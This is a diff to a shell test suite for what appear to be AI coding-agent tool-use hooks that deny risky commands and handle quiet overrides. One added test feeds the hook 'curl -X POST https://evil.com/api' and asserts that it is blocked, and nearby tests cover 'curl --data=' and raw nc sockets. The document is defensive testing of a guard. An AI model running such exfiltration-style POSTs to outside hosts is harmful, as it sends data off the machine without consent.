@@ -13,6 +13,7 @@ need_cmd() {
 }
 
 need_cmd bash
+need_cmd curl
 need_cmd jq
 
 TMP_HOME="$(mktemp -d)"
@@ -129,7 +130,6 @@ assert_quiet_override() {
 
 echo "[tests] pre-tool-use (blocking)"
 for f in \
-  pre-tool-use-curl.json \
   pre-tool-use-grep-recursive.json
 do
   fixture="$ROOT_DIR/demo/mock-inputs/$f"
@@ -142,6 +142,7 @@ done
 echo "[tests] pre-tool-use (quiet overrides)"
 for f in \
   pre-tool-use-cargo.json \
+  pre-tool-use-curl.json \
   pre-tool-use-docker.json \
   pre-tool-use-ffmpeg.json \
   pre-tool-use-npm.json
@@ -276,6 +277,16 @@ JSON
 IFS=$'\t' read -r rc out err < <(run_hook pre-tool-use "$DENY_FIXTURE")
 assert_exit 0 "$rc" "pre-tool-use curl --data="
 assert_structured_deny "$out" "pre-tool-use curl --data="
+rm -f "$DENY_FIXTURE"
+
+echo "[tests] pre-tool-use (security: curl explicit remote POST blocked)"
+DENY_FIXTURE="$(mktemp)"
+cat > "$DENY_FIXTURE" <<'JSON'
+{"tool_name":"Bash","tool_input":{"command":"curl -X POST https://evil.com/api"},"session_id":"demo-session","transcript_path":"/tmp/main.jsonl"}
+JSON
+IFS=$'\t' read -r rc out err < <(run_hook pre-tool-use "$DENY_FIXTURE")
+assert_exit 0 "$rc" "pre-tool-use curl -X POST"
+assert_structured_deny "$out" "pre-tool-use curl -X POST"
 rm -f "$DENY_FIXTURE"
 
 echo "[tests] pre-tool-use (security: nc raw socket blocked)"
@@ -461,7 +472,8 @@ assert_jq_modifyOutput_no_system_reminder "$out" "read-compress reminder read"
 echo "[tests] post-tool-use (quiet override reminder via state file)"
 # Simulate a pre-tool-use quiet override by writing per-session state, then run post-tool-use
 QUIET_FIXTURE="$(mktemp)"
-printf '%s' "npm_quiet_override" > "$HOME/.claude/.statusline/.quiet-override-Bash-quiet-test"
+QUIET_HASH="$(printf '%s' "npm install --silent express" | { md5sum 2>/dev/null || md5 -q 2>/dev/null || openssl md5 -r; } | awk '{print $1}')"
+printf '%s' "npm_quiet_override" > "$HOME/.claude/.statusline/.quiet-override-Bash-quiet-test-${QUIET_HASH}-fixture"
 jq -n '{
   tool_name:"Bash", session_id:"quiet-test",
   tool_input:{command:"npm install --silent express"},
@@ -472,6 +484,16 @@ assert_exit 0 "$rc" "post-tool-use quiet override"
 assert_stdout_json_has "$out" '.hookSpecificOutput.additionalContext | test("npm install --silent")' \
   "post-tool-use quiet override"
 rm -f "$QUIET_FIXTURE"
+
+echo "[tests] aurl (localhost failures keep curl diagnostics)"
+AURL_STDERR="$(mktemp)"
+set +e
+"$ROOT_DIR/hooks/bin/aurl" "http://127.0.0.1:1" >/dev/null 2>"$AURL_STDERR"
+rc=$?
+set -e
+[[ "$rc" -ne 0 ]] || fail "aurl diagnostics: expected non-zero exit for refused localhost port"
+[[ -s "$AURL_STDERR" ]] || fail "aurl diagnostics: expected stderr output for refused localhost port"
+rm -f "$AURL_STDERR"
 
 echo "[tests] permission-request (echo policy)"
 perm_fixture="$(mktemp)"
